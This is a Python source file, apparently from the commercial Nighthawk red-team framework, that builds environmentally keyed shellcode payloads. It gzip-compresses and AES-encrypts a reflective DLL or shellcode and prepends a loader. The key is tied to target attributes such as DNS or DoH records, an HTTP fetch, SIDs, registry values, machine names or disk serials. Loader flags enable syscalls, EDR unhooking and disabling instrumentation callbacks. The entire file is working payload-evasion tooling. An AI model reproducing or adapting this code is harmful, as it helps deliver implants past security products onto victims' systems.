# Copyright 2022 MDSec Consulting Ltd
# Use of this source code is governed by an End User License Agreement,
# details of this agreement can be found in EULA.pdf
# Nighthawk (r)

import os
import sys
import struct
import argparse
import gzip
import binascii
import math
import StringIO
from collections import deque
from base64 import b64decode

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Hash import HMAC, SHA256, SHA512
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes

class EPayloadKeyingStrategy(object):
	NONE = 0
	EMBEDDED = 1
	DNS = 2
	HTTP = 3
	DOH = 4
	SID = 5
	REGKEY = 6
	FILE = 7
	NAME = 8
	DISK = 9

	@staticmethod
	def name(value):
		return {
				EPayloadKeyingStrategy.NONE : "NONE",
				EPayloadKeyingStrategy.EMBEDDED : "EMBEDDED",
				EPayloadKeyingStrategy.DNS : "DNS",
				EPayloadKeyingStrategy.HTTP : "HTTP",
				EPayloadKeyingStrategy.SID : "SID",
				EPayloadKeyingStrategy.NAME : "NAME",
				EPayloadKeyingStrategy.FILE : "FILE",
				EPayloadKeyingStrategy.REGKEY : "REGKEY",
				EPayloadKeyingStrategy.DOH : "DOH",
				EPayloadKeyingStrategy.DISK : "DISK",
			}[value]

class KeyedShellcodeGenerator(object):
	'''
		This code stub is for an RDLL that uses the prototype: VOID WINAPI ReflectiveLoader(VOID)
		The size of the stub aligned up to 16 bytes plus the offset to ReflectiveLoader() are stored
		at the offset X84_CODE_OFFSET
	'''
	# key size in bytes
	AES_128_KEY_LENGTH = 16
	
	#
	# Miscellaneous flags
	#
	EP_FLAG_USE_SYSCALLS = (1 << 1)    # Use system calls for loading RDLL
	EP_FLAG_USE_THREADPOOL = (1 << 3)  # Use the thread pool to load DLLs
	EP_FLAG_DISABLE_PI = (1 << 4)
	EP_FLAG_INDIRECT_SYSCALLS = (1 << 5)
	EP_FLAG_UNHOOK_COMMON = (1 << 6)
	EP_FLAG_UNHOOK_GUARD = (1 << 7)
	EP_FLAG_AVOID_HEAPALLOC = (1 << 8)

	#
	# Main types of keying.
	#
	EP_KEY_TYPE_EMBEDDED = 0  # Embedded in header.
	EP_KEY_TYPE_DNS = 1 # DNS TXT or CNAME record.
	EP_KEY_TYPE_HTTP = 2  # HTTP GET request.
	EP_KEY_TYPE_SID = 3  # User or Domain SID.
	EP_KEY_TYPE_NAME = 4  # User or Computer name.
	EP_KEY_TYPE_FILE = 5  # Data read from file incl. named pipe.
	EP_KEY_TYPE_REGISTRY = 6  # Windows Registry.
	EP_KEY_TYPE_DOH = 7  # DNS over HTTPS. Supports TXT or CNAME records.
	EP_KEY_TYPE_DISK = 8  # Disk serial number.

	#
	# Sub types of keying.
	#

	# Record type for DNS queries (incl. DOH)
	EP_KEY_DNS_TYPE_TXT = 1
	EP_KEY_DNS_TYPE_CNAME = 2

	# Root key for registry queries.
	EP_KEY_REG_TYPE_HKLM = 1
	EP_KEY_REG_TYPE_HKCU = 2

	# Type for SID
	EP_KEY_SID_TYPE_USER = 1
	EP_KEY_SID_TYPE_DOMAIN = 2

	# Type for Name
	EP_KEY_NAME_TYPE_USER = 1
	EP_KEY_NAME_TYPE_COMPUTER = 2

	# Query a file or pipe name for the key.
	EP_KEY_FILE_TYPE_DISK = 1
	EP_KEY_FILE_TYPE_PIPE = 2

	# Settings for key generation and encryption.
	EP_MAX_KEY_DATA_LEN = 48
	# Key data for all key types is first processed with SHA-256.
	EP_MAC_LEN = 16          # HMAC-SHA256

	EP_MAX_STRING_LEN = 256

	@staticmethod
	def __ep_parse_key_params(key_type, keying_params):
		subkey_type = 0
		key_offset = 0
		key_length = 0
		path = ""
		value = ""

		if key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_DISK:
			pass
		
		elif key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_DNS:
			subkey_type = keying_params["type"].lower()
			
			if subkey_type == "txt":
				subkey_type = KeyedShellcodeGenerator.EP_KEY_DNS_TYPE_TXT
			elif subkey_type == "cname":
				subkey_type = KeyedShellcodeGenerator.EP_KEY_DNS_TYPE_CNAME
			else:
				raise Exception("Invalid record type for DNS keying")

			path = keying_params["domain"]
			
		elif key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_DOH:
			path = keying_params["url"]
			
			subkey_type = keying_params["type"].lower()

			if subkey_type == "txt":
				subkey_type = KeyedShellcodeGenerator.EP_KEY_DNS_TYPE_TXT
			elif subkey_type == "cname":
				subkey_type = KeyedShellcodeGenerator.EP_KEY_DNS_TYPE_CNAME
			else:
				raise Exception("Invalid record type for DNS keying")

			value = keying_params["domain"]
			
		elif key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_HTTP:
			path = keying_params["url"]
			
			key_offset = int(keying_params["offset"])

			if "ua" in keying_params:
				value = keying_params["ua"]
				value = b64decode(value)
			
		elif key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_SID:
			subkey_type = keying_params["type"].lower()
			
			if subkey_type == "user":
				subkey_type = KeyedShellcodeGenerator.EP_KEY_SID_TYPE_USER
			elif subkey_type == "domain":
				subkey_type = KeyedShellcodeGenerator.EP_KEY_SID_TYPE_DOMAIN
			else:
				raise Exception("Invalid record type for SID keying")

		elif key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_NAME:
			subkey_type = keying_params["type"].lower()
			
			if subkey_type == "user":
				subkey_type = KeyedShellcodeGenerator.EP_KEY_NAME_TYPE_USER
			elif subkey_type == "computer":
				subkey_type = KeyedShellcodeGenerator.EP_KEY_NAME_TYPE_COMPUTER
			else:
				raise Exception("Invalid record type for name keying")

		elif key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_REGISTRY:
			subkey_type = keying_params["hive"].lower()
			
			if subkey_type == "hklm":
				subkey_type = KeyedShellcodeGenerator.EP_KEY_REG_TYPE_HKLM
			elif subkey_type == "hkcu":
				subkey_type = KeyedShellcodeGenerator.EP_KEY_REG_TYPE_HKCU
			else:
				raise Exception("Invalid record type for registry keying")

			path = keying_params["path"]
			
			value = keying_params["value"]
			
		elif key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_FILE:
			path = keying_params["path"]

			key_offset = int(keying_params["offset"])
			
		else:
			raise Exception("[-] Invalid key type:", key_type)

		return subkey_type, key_offset, path, value

	@staticmethod
	def __ep_encrypt_rdll(inbuf, key_data, iterations):
		iv = get_random_bytes(AES.block_size)
		salt = get_random_bytes(AES.block_size)

		pwd = SHA256.new(data=key_data)

		keys = PBKDF2(
			pwd.digest(),
			salt,
			KeyedShellcodeGenerator.AES_128_KEY_LENGTH * 2,
			count=iterations * 1000,
			hmac_hash_module=SHA512)

		mac = HMAC.new(keys[:KeyedShellcodeGenerator.AES_128_KEY_LENGTH], digestmod=SHA256)
		aes = AES.new(keys[KeyedShellcodeGenerator.AES_128_KEY_LENGTH:], AES.MODE_CBC, iv)

		mac.update(inbuf)
		outbuf = aes.encrypt(pad(inbuf, AES.block_size))

		return outbuf, mac.digest()[:KeyedShellcodeGenerator.EP_MAC_LEN], iv, salt

	@staticmethod
	def __get_key_type(key_type, subkey_type):
		if key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_FILE:
			return "File"
		if key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_EMBEDDED:
			return "Embedded"
		if key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_DNS:
			return "DNS," + ("CNAME", "TXT")[subkey_type == KeyedShellcodeGenerator.EP_KEY_DNS_TYPE_TXT]
		if key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_DOH:
			return "DoH," + ("CNAME", "TXT")[subkey_type == KeyedShellcodeGenerator.EP_KEY_DNS_TYPE_TXT]
		if key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_SID:
			return "SID," + ("User",
							 "Domain")[subkey_type == KeyedShellcodeGenerator.EP_KEY_SID_TYPE_DOMAIN]
		if key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_REGISTRY:
			return "Registry," + ("HKLM",
								  "HKCU")[subkey_type == KeyedShellcodeGenerator.EP_KEY_REG_TYPE_HKCU]
		if key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_NAME:
			return "Name," + ("User",
							  "Computer")[subkey_type == KeyedShellcodeGenerator.EP_KEY_NAME_TYPE_COMPUTER]
		if key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_DISK:
			return "Disk serial number"
		if key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_HTTP:
			return "HTTPS"
		return "Unknown"

	'''
		Convert loader flags to string
	'''

	@staticmethod
	def __get_ldr_flags(ldr_flags):
		if ldr_flags == 0:
			return "N/A"

		flags = ""

		if ldr_flags & KeyedShellcodeGenerator.EP_FLAG_USE_SYSCALLS:
			flags += "Syscalls,"
		if ldr_flags & KeyedShellcodeGenerator.EP_FLAG_USE_THREADPOOL:
			flags += "Threadpool,"

		flags, x = flags[:-1], flags[-1]
		return flags

	'''
		Convert bytes to human readable string
	'''

	@staticmethod
	def __format_size(size_bytes):
		if size_bytes == 0:
			return "0B"
		size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
		i = int(math.floor(math.log(size_bytes, 1024)))
		p = math.pow(1024, i)
		s = round(size_bytes / p, 2)
		return "%s %s" % (s, size_name[i])

	'''
		Compress data using GZIP. Prepend the original and compressed length.
	'''

	@staticmethod
	def __ep_compress_rdll(inbuf, level):
		buf = StringIO.StringIO()
		comp = gzip.GzipFile(fileobj=buf, compresslevel=level, mode="wb")
		comp.write(inbuf)
		comp.close()
		outbuf = buf.getvalue()
		return struct.pack("<II", len(outbuf), len(inbuf)) + outbuf

	@staticmethod
	def __build_shellcode(shellcode, is_arch_x64, payload_key, keying_strategy, keying_params):
		key_type = {
				EPayloadKeyingStrategy.EMBEDDED : KeyedShellcodeGenerator.EP_KEY_TYPE_EMBEDDED,  # Embedded in header.
				EPayloadKeyingStrategy.DNS : KeyedShellcodeGenerator.EP_KEY_TYPE_DNS,            # DNS TXT or CNAME record.
				EPayloadKeyingStrategy.HTTP : KeyedShellcodeGenerator.EP_KEY_TYPE_HTTP,          # HTTP GET request.
				EPayloadKeyingStrategy.SID : KeyedShellcodeGenerator.EP_KEY_TYPE_SID,            # User or Domain SID.
				EPayloadKeyingStrategy.NAME : KeyedShellcodeGenerator.EP_KEY_TYPE_NAME,          # User or Computer name.
				EPayloadKeyingStrategy.FILE : KeyedShellcodeGenerator.EP_KEY_TYPE_FILE,          # Data read from file incl. named pipe.
				EPayloadKeyingStrategy.REGKEY : KeyedShellcodeGenerator.EP_KEY_TYPE_REGISTRY,    # Windows Registry.
				EPayloadKeyingStrategy.DOH : KeyedShellcodeGenerator.EP_KEY_TYPE_DOH,            # DNS over HTTPS. Supports TXT or CNAME records.
				EPayloadKeyingStrategy.DISK : KeyedShellcodeGenerator.EP_KEY_TYPE_DISK,          # Disk serial number.
			}[keying_strategy]

		subkey_type = 0
		ldr_flags = 0
		key_offset = 0
		key_length = 0
		path = ""
		value = ""
		
		if (not os.path.exists("exoldr.x86.exe.bin")) or (not os.path.exists("exoldr.x64.exe.bin")):
			return
		
		if "loader-loadlib" in keying_params and keying_params["loader-loadlib"].lower() == "threadpool":
			ldr_flags |= KeyedShellcodeGenerator.EP_FLAG_USE_THREADPOOL
		
		if "loader-strategy" in keying_params and keying_params["loader-strategy"].lower() == "syscalls":
			ldr_flags |= KeyedShellcodeGenerator.EP_FLAG_USE_SYSCALLS
		
		if "loader-disable-pi-callback" in keying_params and keying_params["loader-disable-pi-callback"].lower() == "true":
			ldr_flags |= KeyedShellcodeGenerator.EP_FLAG_DISABLE_PI

		if "loader-indirect-syscalls" in keying_params and keying_params["loader-indirect-syscalls"].lower() == "true":
			ldr_flags |= KeyedShellcodeGenerator.EP_FLAG_INDIRECT_SYSCALLS

		if "loader-unhook" in keying_params and keying_params["loader-unhook"].lower() == "true":
			ldr_flags |= KeyedShellcodeGenerator.EP_FLAG_UNHOOK_COMMON

		if "loader-unhook-clear-guard" in keying_params and keying_params["loader-unhook-clear-guard"].lower() == "true":
			ldr_flags |= KeyedShellcodeGenerator.EP_FLAG_UNHOOK_GUARD

		if "loader-avoid-heapalloc" in keying_params and keying_params["loader-avoid-heapalloc"].lower() == "true":
			ldr_flags |= KeyedShellcodeGenerator.EP_FLAG_AVOID_HEAPALLOC

		if key_type != KeyedShellcodeGenerator.EP_KEY_TYPE_EMBEDDED:
			subkey_type, key_offset, path, value = KeyedShellcodeGenerator.__ep_parse_key_params(key_type, keying_params)

		if key_type in [
					KeyedShellcodeGenerator.EP_KEY_TYPE_SID,
					KeyedShellcodeGenerator.EP_KEY_TYPE_NAME,
					KeyedShellcodeGenerator.EP_KEY_TYPE_REGISTRY,
					KeyedShellcodeGenerator.EP_KEY_TYPE_DISK,
					KeyedShellcodeGenerator.EP_KEY_TYPE_DNS,
					KeyedShellcodeGenerator.EP_KEY_TYPE_DOH
				]:
			payload_key = payload_key.lower()

		payload_key = bytes(payload_key)

		if key_type in [KeyedShellcodeGenerator.EP_KEY_TYPE_HTTP, KeyedShellcodeGenerator.EP_KEY_TYPE_FILE]:
			key_length = len(payload_key)

		if not shellcode:
			return

		packed = KeyedShellcodeGenerator.__ep_compress_rdll(shellcode, 9)
		if not packed:
			return

		encrypted, mac, iv, salt = KeyedShellcodeGenerator.__ep_encrypt_rdll(packed, payload_key, 1)
		if not encrypted:
			return

		pic = None
	
		if not is_arch_x64:
			pic = open("exoldr.x86.exe.bin", "rb").read()
		else:
			pic = open("exoldr.x64.exe.bin", "rb").read()
		
		outbuf = struct.pack(
			"<IBBH",
			len(encrypted),
			key_type,
			subkey_type,
			1)

		if key_type == KeyedShellcodeGenerator.EP_KEY_TYPE_EMBEDDED:
			outbuf += payload_key
		else:
			outbuf += 16 * b'\0'

		outbuf += salt
		outbuf += iv
		outbuf += mac

		outbuf += struct.pack("<III", ldr_flags, key_length, key_offset)
		outbuf += path.ljust(KeyedShellcodeGenerator.EP_MAX_STRING_LEN, '\0').encode()
		outbuf += value.ljust(KeyedShellcodeGenerator.EP_MAX_STRING_LEN, '\0').encode()
		outbuf += struct.pack("<I", 0) # alignment

		outbuf += encrypted

		outbuf = pic + outbuf
		
		return outbuf

	@staticmethod
	def __validate_keying_params(keying_strategy, keying_params):
		if keying_strategy == EPayloadKeyingStrategy.NONE:
			pass
		elif keying_strategy == EPayloadKeyingStrategy.EMBEDDED:
			pass
		elif keying_strategy == EPayloadKeyingStrategy.DNS:
			if "type" not in keying_params or "domain" not in keying_params:
				return

			if "txt" not in keying_params["type"] and "cname" not in keying_params["type"]:
				return
		elif keying_strategy == EPayloadKeyingStrategy.HTTP:
			if "url" not in keying_params or "offset" not in keying_params:
				return
		elif keying_strategy == EPayloadKeyingStrategy.DOH:
			if "url" not in keying_params or "type" not in keying_params or "domain" not in keying_params:
				return

			if "txt" not in keying_params["type"] and "cname" not in keying_params["type"]:
				return
		elif keying_strategy == EPayloadKeyingStrategy.SID:
			if "type" not in keying_params:
				return

			if "user" not in keying_params["type"] and "domain" not in keying_params["type"]:
				return
		elif keying_strategy == EPayloadKeyingStrategy.REGKEY:
			if "hive" not in keying_params or "path" not in keying_params or "value" not in keying_params:
				return

			if "HKLM" not in keying_params["hive"] and "HKCU" not in keying_params["hive"]:
				return
		elif keying_strategy == EPayloadKeyingStrategy.FILE:
			if "path" not in keying_params or "offset" not in keying_params:
				return
		elif keying_strategy == EPayloadKeyingStrategy.NAME:
			if "type" not in keying_params:
				return

			if "user" not in keying_params["type"] and "computer" not in keying_params["type"]:
				return
		elif keying_strategy == EPayloadKeyingStrategy.DISK:
			pass

		return True

	@staticmethod
	def convert_shellcode_to_keyed_shellcode(shellcode, is_arch_x64, payload_key, keying_strategy, keying_params):
		if keying_strategy == EPayloadKeyingStrategy.NONE:
			return shellcode

		if not KeyedShellcodeGenerator.__validate_keying_params(keying_strategy, keying_params):
			return

		keyed_shellcode = KeyedShellcodeGenerator.__build_shellcode(shellcode, is_arch_x64, payload_key, keying_strategy, keying_params)
		keyed_shellcode = keyed_shellcode + "CSHN" + struct.pack("<I", len(keyed_shellcode) + 8) # embeds the length of the shellcode for later erasure

		return keyed_shellcode